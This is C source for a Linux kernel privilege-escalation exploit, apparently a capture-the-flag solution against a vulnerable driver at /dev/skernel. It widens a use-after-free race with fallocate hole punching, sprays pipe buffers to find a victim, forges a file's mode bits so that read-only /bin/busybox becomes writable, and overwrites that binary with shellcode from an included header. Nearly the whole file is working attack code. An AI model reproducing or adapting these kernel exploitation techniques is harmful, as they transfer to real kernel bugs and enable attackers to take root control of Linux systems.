#define _GNU_SOURCE
#include <err.h>
#include <assert.h>
#include <fcntl.h>
#include <linux/falloc.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define SYSCHK(x)                                                              \
  ({                                                                           \
    typeof(x) __res = (x);                                                     \
    if (__res == (typeof(x))-1)                                                \
      err(1, "SYSCHK(" #x ")");                                                \
    __res;                                                                     \
  })

typedef struct {
  int fd_r;
  int fd_w;
} pipe_t;

pipe_t *pipe_init;

#define FALLOC_LEN 64 * 1024 * 700 // Max on Ubuntu 25.04
#define PAGESIZE 0x1000

pthread_barrier_t barrier;
pthread_t t1;
int ffd;
char *fmap;
int start = 0;
int fd;
int pipes[2];

// ######################################################################
// ######################################################################

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void pausa() {
  printf("[!] PAUSA - pulsa una tecla.\n");
  getchar();
}

int open_file(char *file, int flags, int verbose) {
  int fd = open(file, flags);
  if (fd < 0) {
    fatal("[!] Error al abrir el archivo.");
  } else {
    if (verbose)
      printf("[*] %s abierto con fd %d.\n", file, fd);
  }
  return fd;
}

void dump_buffer(void *buf, int len) {
  printf("\n[i] Dumping %d bytes.\n\n", len);
  for (int i = 0; i < len; i += 0x10) {
    printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x08, i,
           (unsigned long)(buf + i));
    for (int j = 7; j >= 0; j--)
      printf("%02x", *(unsigned char *)(buf + i + j));
    printf(" - 0x");
    for (int j = 7; j >= 0; j--)
      printf("%02x", *(unsigned char *)(buf + i + j + 8));
    puts("");
  }
}

// ######################################################################
// ######################################################################

struct ioctl_request {
  unsigned int idx;     // Índice del objeto (0-7) - 4 bytes
  unsigned int padding; // Padding para alineación - 4 bytes
  unsigned long size;   // Tamaño para operaciones de escritura - 8 bytes
  void *buf;            // Puntero a datos del usuario - 8 bytes
}; // Total: 24 bytes (0x18)

// Comandos IOCTL
#define IOCTL_ALLOC 0x13371337 // Asigna un objeto de 3520 bytes
#define IOCTL_FREE 0x13371338  // Libera un objeto y copia 64 bytes del usuario
#define IOCTL_WRITE 0x13371339 // Escribe datos en un objeto asignado

// ######################################################################

void setup_pipe(pipe_t pipe) {
  if (fcntl(pipe.fd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) {
    fatal("fcntl");
  }
}

void spray_pipe_buffer(int alloc_num, pipe_t *pipeid) {
  uint64_t idx;
  for (int i = 0; i < alloc_num; i++) {
    idx = (uint64_t)i + 1;
    pipe((int *)&pipeid[i]);
    setup_pipe(pipeid[i]);
    write(pipeid[i].fd_w, &idx, sizeof(idx));
    write(pipeid[i].fd_w, "teamTHC", 8);
  }
}

void free_pipe_buffer(pipe_t *free_pipe) {
  close(free_pipe->fd_w);
  close(free_pipe->fd_r);
  free_pipe->fd_w = -1;
  free_pipe->fd_w = -1;
}

int ioctl_alloc(int fd, unsigned int index) {
  struct ioctl_request req = {0};
  req.idx = index;
  req.size =
      1; // Debe ser <= 64 para pasar la validación (request_size - 1 > 0x3F)
  req.buf = NULL;

  int ret = ioctl(fd, IOCTL_ALLOC, &req);
  if (ret < 0) {
    perror("[!] ioctl_alloc failed");
  } else {
    printf("[+] Objeto asignado en índice %u\n", index);
  }
  return ret;
}

int ioctl_free(int fd, unsigned int index, void *user_data, int verbose) {
  struct ioctl_request req = {0};
  req.idx = index;
  req.size =
      1; // Debe ser <= 64 para pasar la validación (request_size - 1 > 0x3F)
  req.buf = user_data; // Puntero desde donde se copiarán 64 bytes

  int ret = ioctl(fd, IOCTL_FREE, &req);

  if (verbose) {
    if (ret < 0) {
      perror("[!] ioctl_free failed");
    } else {
      printf("[+] Objeto liberado en índice %u\n", index);
    }
  }
  return ret;
}

int ioctl_write(int fd, unsigned int index, void *user_data,
                unsigned long size) {
  struct ioctl_request req = {0};
  req.idx = index;
  req.size = size;
  req.buf = user_data;

  int ret = ioctl(fd, IOCTL_WRITE, &req);
  if (ret < 0) {
    perror("[!] ioctl_write failed");
  } else {
    printf("[+] Escritos %lu bytes en objeto índice %u\n", size, index);
  }
  return ret;
}

void hole_punch() {
  SYSCHK(ffd = open("/dev/shm/", O_TMPFILE | O_RDWR, 0666));
  SYSCHK(fallocate(ffd, 0, 0, FALLOC_LEN));
  SYSCHK(fmap = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, ffd, 0));

  pthread_barrier_wait(&barrier); // barrier 1
  SYSCHK(fallocate(ffd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0,
                   FALLOC_LEN));
}

void *free_race(void *arg) {
  char buf[64] = {0};

  while (start == 0)
    ;
  fcntl(pipes[1], F_SETPIPE_SZ, 0x1000);
  write(pipes[1], buf, 1);
  ioctl_write(fd, 0, "\x00", 1);
}
#include "shellcode.h"
  
int main() {
  char bufer[64] = {0};
  bind_core(0);
  fd = open_file("/dev/skernel", O_RDWR, 1);
  pthread_create(&t1, NULL, free_race, NULL);

  pipe_init = malloc((200) * sizeof(pipe_t));
  spray_pipe_buffer(200, pipe_init);

  pipe(pipes);


  ioctl_alloc(fd, 0);
  ioctl_alloc(fd, 1);


  pthread_barrier_init(&barrier, NULL, 2);
  pthread_t hole_punch_thread;
  SYSCHK(pthread_create(&hole_punch_thread, NULL, (void *)hole_punch, NULL));
  pthread_barrier_wait(&barrier); // barrier 1

  start = 1;
  ioctl_free(fd, 0, fmap, 0);

  uint64_t buf = 0;
  read(pipes[0], &buf, 2);
  printf("%d\n", buf);
  if (buf == 0) {
    puts("[!] cannot find victim pipe");
    exit(1);
  }

  close(pipe_init[buf - 1].fd_r);
  close(pipe_init[buf - 1].fd_w);

  int filefds[0x500];
  for (int i = 0; i < 0x500; i++) {
    int fd =  open("/bin/busybox", O_RDONLY);
    // assert(fd != -1);
    filefds[i] = fd;
  }

//   /* char fake_f_mode[200] = {0}; */
  int fake_f_mode = 0x84f801f;
  write(pipes[1], &fake_f_mode, 4); // test for 8
  write(pipes[1], &fake_f_mode, 4); // test for 8
  
//   char payload[] =
    //   "::askfirst:/bin/ash";
  printf("[*] gogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogogo\n");
  for (int i = 0; i < 0x500; i++) {
    if (write(filefds[i], shellcode, sizeof(shellcode)) != -1) {
      puts("[+] SuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccessSuccess");
      break;
    }
  }

  /* pausa(); */
  return 0;
}